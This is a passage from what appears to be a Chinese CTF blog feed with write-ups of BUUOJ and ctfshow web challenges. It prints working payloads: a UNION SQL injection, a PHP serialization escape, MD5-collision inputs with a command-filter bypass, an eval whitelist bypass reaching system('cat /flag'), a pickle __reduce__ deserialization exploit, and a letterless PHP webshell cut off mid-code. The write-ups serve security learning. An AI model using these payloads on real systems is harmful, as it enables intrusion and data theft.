class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>, (<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(b)<span class="comment">/**/</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure><img src="/2020/05/11/buuoj2/22.png" class="" title="examplename"><h4 id="0X10-安洵杯-2019-easy-serialize-php"><a href="#0X10-安洵杯-2019-easy-serialize-php" class="headerlink" title="0X10:[安洵杯 2019]easy_serialize_php"></a>0X10:[安洵杯 2019]easy_serialize_php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>function有三个参数，根据提示在phpinfo()页面可以找到提示，访问一下</p><img src="/2020/05/11/buuoj2/23.png" class="" title="examplename"><p>可以看到自动包含了一个文件，打开不能读取数据，可以看到应该要用序列化的字符逃逸，序列化时会经过一个过滤函数，过滤掉的字符在序列化数据中就可以去掉一些不必要的数据</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>"</span>;s:<span class="number">3</span>:“img”;s:<span class="number">20</span>:“ZDBnM19mMWFnLnBocA==”;s:<span class="number">2</span>:“dd”;s:<span class="number">1</span>:“a”;&#125;</span><br></pre></td></tr></table></figure><p>序列化后：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:“user”;s:<span class="number">24</span>:“flagflagflagflagflagflag”;s:<span class="number">8</span>:“<span class="function"><span class="keyword">function</span>”</span>;s:<span class="number">59</span>:“a”;s:<span class="number">3</span>:“img”;s:<span class="number">20</span>:“ZDBnM19mMWFnLnBocA==”;s:<span class="number">2</span>:“dd”;s:<span class="number">1</span>:“a”;&#125;<span class="string">";s:3:“img”;s:28:“L3VwbG9hZC9ndWVzdF9pbWcuanBn”;&#125;</span></span><br><span class="line"><span class="string">//由于没有传img_path参数，源代码给了默认的参数值guest_img.png</span></span><br></pre></td></tr></table></figure><p>经过过滤之后flag被去掉，空出了24个字符就会往后拿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:“user”;s:<span class="number">24</span>:<span class="string">""</span>;s:<span class="number">8</span>:“<span class="function"><span class="keyword">function</span>”</span>;s:<span class="number">59</span>:“a”;s:<span class="number">3</span>:“img”;s:<span class="number">20</span>:“ZDBnM19mMWFnLnBocA==”;s:<span class="number">2</span>:“dd”;s:<span class="number">1</span>:“a”;&#125;<span class="string">";s:3:“img”;s:28:“L3VwbG9hZC9ndWVzdF9pbWcuanBn”;&#125;</span></span><br></pre></td></tr></table></figure><p>这样a:3刚好有三个键值对，后面的<code>&quot;;s:3:“img”;s:28:“L3VwbG9hZC9ndWVzdF9pbWcuanBn”;}</code>就被去掉了</p><img src="/2020/05/11/buuoj2/24.png" class="" title="examplename"><p>再改一下要读取的文件base64编码</p><img src="/2020/05/11/buuoj2/25.png" class="" title="examplename"><h4 id="0X11-安洵杯-2019-easy-web"><a href="#0X11-安洵杯-2019-easy-web" class="headerlink" title="0X11:[安洵杯 2019]easy_web"></a>0X11:[安洵杯 2019]easy_web</h4><p>打开题目，没有发现什么有用的信息，只看到了一个MD5 is fun，抓一下包，感觉img参数比较可疑</p><img src="/2020/05/11/buuoj2/26.png" class="" title="examplename"><p>base64解密两次，hex解密一次，发现是555.png，那么index.phphex加密，再base64加密两次可能可以访问</p><p>成功拿到源码，去掉了部分没用的东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>md5碰撞直接可以找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>可以发现几乎过滤了所有的读取方式，上次的比赛记得cat可以用ca\t绕过，具体的原因也没有去查找资料，有时间再弄，这里直接拿来用了</p><img src="/2020/05/11/buuoj2/27.png" class="" title="examplename"><p>在根目录下发现flag文件，直接读取</p><img src="/2020/05/11/buuoj2/28.png" class="" title="examplename"><h4 id="0X12-CISCN-2019-初赛-Love-Math"><a href="#0X12-CISCN-2019-初赛-Love-Math" class="headerlink" title="0X12:[CISCN 2019 初赛]Love Math"></a>0X12:[CISCN 2019 初赛]Love Math</h4><p>源码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目中有长度限制，中括号被ban掉了，要用进制转换，base_convert ，dechex，第一个可以进行进制之间的转换，比如 base_convert(“1001”2,10)是将二进制的1001转换为10进制，第二个函数是将10进制转成16进制。payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=$_GET[a]($_GET[b])&amp;a=system&amp;b=cat falg</span><br></pre></td></tr></table></figure><p>再用进制转换一下，用上上面的两个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$pi=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));$$pi&#123;pi&#125;($$pi&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span><br></pre></td></tr></table></figure><h4 id="0X13-CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#0X13-CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="0X13:[CISCN2019 华北赛区 Day1 Web2]ikun"></a>0X13:[CISCN2019 华北赛区 Day1 Web2]ikun</h4><img src="/2020/05/11/buuoj2/29.png" class="" title="examplename"><p>需要找到lv6，手翻了几页，找不到，写个脚本来找</p><img src="/2020/05/11/buuoj2/30.png" class="" title="examplename"><p>在181页，可以看到价格太高了，猜测可能是js能做修改，发现discount的值能改，改成一个很小的值，提示需要为admin才能访问，在cookie里找到了jwt，放到jwt.io</p><img src="/2020/05/11/buuoj2/31.png" class="" title="examplename"><p>需要让username为admin，这里用到了一个破解工具jwtcrack<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker</a></p><img src="/2020/05/11/buuoj2/32.png" class="" title="examplename"><p>弄到了密钥，就能够更改得到需要的jwt了，再修改cookie，提示要成为大会员，再源码处发现了<a href="http://www.zip文件，下载过来是一堆python文件，挨个查看，找到了有关序列化的代码" target="_blank" rel="noopener">www.zip文件，下载过来是一堆python文件，挨个查看，找到了有关序列化的代码</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">"admin"</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'no_ass.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>找了python序列化资料，说是python反序列化后产生的对象会在结束时触发<strong>reduce</strong>()函数从而触发恶意代码，重写<em>reduce</em>()魔术方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))    <span class="comment">#打开读取flag.txt的内容</span></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())  <span class="comment">#序列化payload</span></span><br><span class="line">a = urllib.quote(a)  <span class="comment">#进行url编码</span></span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line">//c__builtin__%<span class="number">0</span>Aeval%<span class="number">0</span>Ap0%<span class="number">0</span>A%<span class="number">28</span>S%<span class="number">22</span>open%<span class="number">28</span>%<span class="number">27</span>/flag.txt%<span class="number">27</span>%<span class="number">2</span>C%<span class="number">27</span>r%<span class="number">27</span>%<span class="number">29.</span>read%<span class="number">28</span>%<span class="number">29</span>%<span class="number">22</span>%<span class="number">0</span>Ap1%<span class="number">0</span>Atp2%<span class="number">0</span>ARp3%<span class="number">0</span>A. 运行结果</span><br></pre></td></tr></table></figure><p>修改become值即可</p><img src="/2020/05/11/buuoj2/33.png" class="" title="examplename">]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0X01-ZJCTF-2019-NiZhuanSiWei&quot;&gt;&lt;a href=&quot;#0X01-ZJCTF-2019-NiZhuanSiWei&quot; class=&quot;headerlink&quot; title=&quot;0X01:[ZJCTF 2019]NiZhuanSiWei&quot;&gt;&lt;/a&gt;0X01:[ZJCTF 2019]NiZhuanSiWei
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow</title>
    <link href="http://yoursite.com/2020/05/05/ctfshow/"/>
    <id>http://yoursite.com/2020/05/05/ctfshow/</id>
    <published>2020-05-05T03:29:39.000Z</published>
    <updated>2020-05-09T00:27:11.147Z</updated>
    
    <content type="html"><![CDATA[<h1 id="36D杯"><a href="#36D杯" class="headerlink" title="36D杯"></a>36D杯</h1><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="0X01-你取吧"><a href="#0X01-你取吧" class="headerlink" title="0X01:你取吧"></a>0X01:你取吧</h4><p>打开题目，给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$hint=file_get_contents(<span class="string">'php://filter/read=convert.base64-encode/resource=hhh.php'</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">'code'</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>);</span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"echo($code);"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里有两种解法，分别是Ying师傅和HA1C9ON师傅的，下面来尝试一下</p><p>1.之前为了做红包题看过一篇p牛的无数字无字母RCE，只不过当时没想到可以这样做，下面是p牛的写的webshell，直接打就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="string">" "</span>);</span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">"$_"</span>; <span class="comment">// $_='Array';</span></span><br><span class="line">$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E </span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">'_'</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span 